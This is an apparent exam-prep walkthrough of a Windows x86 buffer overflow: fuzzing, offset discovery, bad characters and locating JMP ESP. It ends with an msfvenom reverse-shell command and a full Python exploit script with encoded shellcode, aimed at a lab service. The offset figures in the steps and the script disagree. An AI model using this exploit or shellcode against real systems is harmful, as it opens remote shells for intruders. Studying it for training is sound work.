
## Buffer Overflow - Windows x86

### Intro

In the exam, you are provided with a fuzzing script already.

Some BO guides:
* https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/

---

### 1. FUZZING TO DETERMINE ~BYTES TO CAUSE A CRASH

Guess the number of bytes it takes to crash the application.

![BOF_STEP1_FUZZ](Images/BOF_STEP1_FUZZ.png)


---


### 2. GENERATE OFFSET-DISCOVERY STRING

```bash
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
```

Look at the value in the **EIP** register.
* `EIP` is the register that we want to control.
* We want to store the address of a `JMP ESP` instruction in EIP, to re-direct execution flow.
* Exploit execution flow: EIP -> JMP ESP -> ESP (shellcode location)

EIP value: 39694438
![BOF_STEP2_OFFSET](Images/BOF_STEP2_OFFSET1.png)


---


### 3. CALCULATE OFFSET

```bash
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [value in EIP]
```

Offset byte number: '2606'
![BOF_STEP3_OFFSET](Images/BOF_STEP3_OFFSET2.png)

---

### 4. CONFIRM OFFSET IS CORRECT

Confirm that your offset is correct by placing a unique 4-byte string into the EIP register.

EIP value: '42424242' = 'BBBB'
![BOF_STEP3_OFFSET](Images/BOF_STEP4_OFFSET3.png)

---

### 5. CHECK FOR BAD CHARACTERS

Characters to test (256 in total):
```python
chars =(
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

Run code with character list -> 'Follow in dump' / go to memory dump:
![BOF_STEP5_BADCHAR1](Images/BOF_STEP5_BADCHAR1.png)

Memory dump with chars payload -> see which bytes causes the truncation:
![BOF_STEP5_BADCHAR2](Images/BOF_STEP5_BADCHAR2.png)

---

### 6. FIND ADDRESS OF A JMP-ESP IN A .DLL

Run `!mona modules` to find a suitable .DLL which has no internal security mechanisms:
![BOF_STEP6_JMPESP1](Images/BOF_STEP6_JMPESP1.png)

Once a .DLL has been found, click on the `e` to list all executable modules/.DLLs loaded with the application and then double-click on the .DLL you found:
![BOF_STEP6_JMPESP2](Images/BOF_STEP6_JMPESP2.png)

Right-click on the instructions windows and select `Search For` ->
* `Command` -> ` JMP ESP`
* `Sequence of Commands` -> `PUSH ESP | RETN`  

Alternative, run `!mona find -s "/xFF/xE4" -m slmfc.dll` to find the OPCODE for `jmp esp` in the entire .DLL:
![BOF_STEP6_JMPESP3](Images/BOF_STEP6_JMPESP3.png)

Choose one of the pointers -> copy its address -> click on "Go to address in Disassembler" -> paste address -> verify that the address actually contains a `JMP ESP` instruction:
![BOF_STEP6_JMPESP4](Images/BOF_STEP6_JMPESP4.png)

---


### 7. GENERATE SHELLCODE

Generate shellcode and add it to the BOF exploit code.  
`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`

Provide the shellcode decoder some stack-space to work with: `"\x90 * 16"` Append NOP instructions to the front of the shellcode.

Final payload:
```Python
#!/usr/bin/python
#
#[*] Exact match at offset 2369
#76E295FD

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

cmd = "OVRFLW "

shellcode = ("\xd9\xc6\xd9\x74\x24\xf4\x5f\x31\xc9\xbd\xc5\x06\x1f\x5e\xb1"
"\x52\x31\x6f\x17\x03\x6f\x17\x83\x2a\xfa\xfd\xab\x48\xeb\x80"
"\x54\xb0\xec\xe4\xdd\x55\xdd\x24\xb9\x1e\x4e\x95\xc9\x72\x63"
"\x5e\x9f\x66\xf0\x12\x08\x89\xb1\x99\x6e\xa4\x42\xb1\x53\xa7"
"\xc0\xc8\x87\x07\xf8\x02\xda\x46\x3d\x7e\x17\x1a\x96\xf4\x8a"
"\x8a\x93\x41\x17\x21\xef\x44\x1f\xd6\xb8\x67\x0e\x49\xb2\x31"
"\x90\x68\x17\x4a\x99\x72\x74\x77\x53\x09\x4e\x03\x62\xdb\x9e"
"\xec\xc9\x22\x2f\x1f\x13\x63\x88\xc0\x66\x9d\xea\x7d\x71\x5a"
"\x90\x59\xf4\x78\x32\x29\xae\xa4\xc2\xfe\x29\x2f\xc8\x4b\x3d"
"\x77\xcd\x4a\x92\x0c\xe9\xc7\x15\xc2\x7b\x93\x31\xc6\x20\x47"
"\x5b\x5f\x8d\x26\x64\xbf\x6e\x96\xc0\xb4\x83\xc3\x78\x97\xcb"
"\x20\xb1\x27\x0c\x2f\xc2\x54\x3e\xf0\x78\xf2\x72\x79\xa7\x05"
"\x74\x50\x1f\x99\x8b\x5b\x60\xb0\x4f\x0f\x30\xaa\x66\x30\xdb"
"\x2a\x86\xe5\x4c\x7a\x28\x56\x2d\x2a\x88\x06\xc5\x20\x07\x78"
"\xf5\x4b\xcd\x11\x9c\xb6\x86\xdd\xc9\x93\x49\xb6\x0b\xe3\x64"
"\x1a\x85\x05\xec\xb2\xc3\x9e\x99\x2b\x4e\x54\x3b\xb3\x44\x11"
"\x7b\x3f\x6b\xe6\x32\xc8\x06\xf4\xa3\x38\x5d\xa6\x62\x46\x4b"
"\xce\xe9\xd5\x10\x0e\x67\xc6\x8e\x59\x20\x38\xc7\x0f\xdc\x63"
"\x71\x2d\x1d\xf5\xba\xf5\xfa\xc6\x45\xf4\x8f\x73\x62\xe6\x49"
"\x7b\x2e\x52\x06\x2a\xf8\x0c\xe0\x84\x4a\xe6\xba\x7b\x05\x6e"
"\x3a\xb0\x96\xe8\x43\x9d\x60\x14\xf5\x48\x35\x2b\x3a\x1d\xb1"
"\x54\x26\xbd\x3e\x8f\xe2\xdd\xdc\x05\x1f\x76\x79\xcc\xa2\x1b"
"\x7a\x3b\xe0\x25\xf9\xc9\x99\xd1\xe1\xb8\x9c\x9e\xa5\x51\xed"
"\x8f\x43\x55\x42\xaf\x41")

JMP_ESP = "\x43\x66\xfe\x52"
NOPS = "\x90"*16
junk = "\x41"*2369 + JMP_ESP + NOPS + shellcode + "C"*(3000-2369-4-16-351)

end = "\r\n"

buffer = cmd + junk + end
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 4455))
	s.send(buffer)
	s.recv(1024)
	s.close()
except Exception as e:
	print(e)
```



### 8. EXTRA


Running out of shell code space?

Use the front of payload instead.
1. Is there any register points to the front of our payload? EAX, EDX?
2. Check JMP register address
```
$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
$ JMP EAX/EBX/ECX/EDX
```
3. Append the address as shell code.
4. Add payload to the front





